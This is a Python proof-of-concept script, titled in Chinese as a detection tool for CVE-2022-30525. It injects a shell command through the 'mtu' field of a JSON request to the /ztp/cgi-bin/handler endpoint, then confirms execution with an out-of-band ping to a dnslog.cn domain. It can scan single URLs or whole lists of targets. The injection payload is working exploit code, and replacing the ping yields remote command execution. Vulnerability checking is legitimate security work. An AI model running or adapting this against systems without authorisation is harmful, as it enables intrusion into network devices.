#!/usr/bin/python3
# -*- conding:utf-8 -*-
import random

import requests
from optparse import OptionParser
import sys
import urllib3
import json
import time


urllib3.disable_warnings()


class CheckVul(object):
    def __init__(self, option):
        self.option = option
        self.url = options.url
        self.file = options.ip_file
        self.res = requests.session()

    def get_dnslog(self):
        t = random.random()
        url = f"http://www.dnslog.cn/getdomain.php?t={t}"
        res1 = self.res.get(url=url)
        if res1.status_code == 200 and "dnslog" in res1.text:
            return res1.text
        else:
            print("获取dnslog失败")

    def test_target(self):
        target_url = self.url + "/ztp/cgi-bin/handler"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "Content-Type": "application/json"
        }
        dns_log = self.get_dnslog()
        print(dns_log)

        data = {
                "command": "setWanPortSt",
                "proto": "dhcp",
                "port": "4",
                "vlan_tagged": "1",
                "vlanid": "5",
                "mtu": f"; ping {dns_log};",
                "data": "hi"
                }
        try:
            response = requests.post(url=target_url, headers=headers, data=json.dumps(data), timeout=5, verify=False)
        except Exception as e:
            pass

        time.sleep(5)
        url_record = f"http://www.dnslog.cn/getrecords.php?t={random.random()}"
        print(self.res.get(url=url_record).text)
        if dns_log in self.res.get(url=url_record).text:
            print(f"{self.url} 存在漏洞!")
        else:
            print(f"{self.url} 不存在漏洞！")

    def check_from_file(self):
        with open(self.file, "r+") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                CheckVul.test_target(self)


def banner():
        print("""
      _____ __      __ ______          ___    ___   ___   ___           ____    ___   _____  ___   _____ 
     / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |__ \         |___ \  / _ \ | ____||__ \ | ____|
    | |      \ \  / / | |__    ______    ) || | | |   ) |   ) | ______   __) || | | || |__     ) || |__  
    | |       \ \/ /  |  __|  |______|  / / | | | |  / /   / / |______| |__ < | | | ||___ \   / / |___ \ 
    | |____    \  /   | |____          / /_ | |_| | / /_  / /_          ___) || |_| | ___) | / /_  ___) |
     \_____|    \/    |______|        |____| \___/ |____||____|        |____/  \___/ |____/ |____||____/
     CVE-2022-30525检测工具
                   """)


if __name__ == "__main__":
    banner()

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="ip_file", help="存放url的文件")
    parser.add_option("-u", "--url", dest="url", type="string", help="目标url地址")
    (options, args) = parser.parse_args()

    if options.url:
        CheckVul(options).test_target()
    elif options.ip_file:
        CheckVul(options).check_from_file()
    else:
        parser.print_help()
        sys.exit(1)

